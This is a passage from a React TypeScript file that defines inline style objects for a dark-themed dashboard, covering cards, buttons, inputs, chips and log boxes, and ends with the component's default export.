  gridColumn: "1 / -1",
};
const cardMaximized: React.CSSProperties = {
  position: "fixed",
  top: "6vh",
  left: "4vw",
  width: "92vw",
  height: "88vh",
  zIndex: 1200,
  overflow: "auto",
  backdropFilter: "blur(6px)",
};
const cardHeader: React.CSSProperties = {
  display: "flex",
  alignItems: "center",
  justifyContent: "space-between",
  marginBottom: 10,
  gap: 8,
};
const winBtn: React.CSSProperties = {
  border: "1px solid rgba(148,163,184,0.35)",
  borderRadius: 7,
  background: "rgba(15,23,42,0.86)",
  color: "#e2e8f0",
  padding: "0.1rem 0.38rem",
  fontSize: "0.75rem",
  cursor: "pointer",
};

const row: React.CSSProperties = { display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 };
const log: React.CSSProperties = {
  border: "1px solid rgba(148,163,184,0.2)",
  borderRadius: 8,
  padding: "0.35rem 0.5rem",
  fontSize: "0.8rem",
  background: "rgba(15,23,42,0.5)",
};
const muted: React.CSSProperties = { color: "#94a3b8", fontSize: "0.82rem" };
const input: React.CSSProperties = {
  width: "100%",
  borderRadius: 8,
  border: "1px solid rgba(148,163,184,0.36)",
  background: "rgba(15,23,42,0.62)",
  color: "#e2e8f0",
  padding: "0.42rem 0.52rem",
  fontSize: "0.8rem",
};
const chip: React.CSSProperties = {
  border: "1px solid rgba(148,163,184,0.35)",
  borderRadius: 8,
  background: "rgba(15,23,42,0.8)",
  color: "#e2e8f0",
  padding: "0.28rem 0.48rem",
  fontSize: "0.74rem",
  cursor: "pointer",
};
const primary: React.CSSProperties = {
  ...chip,
  border: "none",
  background: "#2563eb",
  color: "#fff",
};

export default Dashboard;
